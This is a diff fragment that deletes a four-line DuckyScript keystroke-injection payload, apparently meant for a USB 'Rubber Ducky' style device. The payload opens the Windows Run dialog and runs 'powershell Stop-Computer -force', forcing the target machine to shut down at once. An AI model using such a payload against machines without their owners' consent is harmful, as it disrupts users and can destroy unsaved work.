@@ -1,4 +1,0 @@
-GUI r
-DELAY 200
-STRING powershell Stop-Computer -force
-ENTER
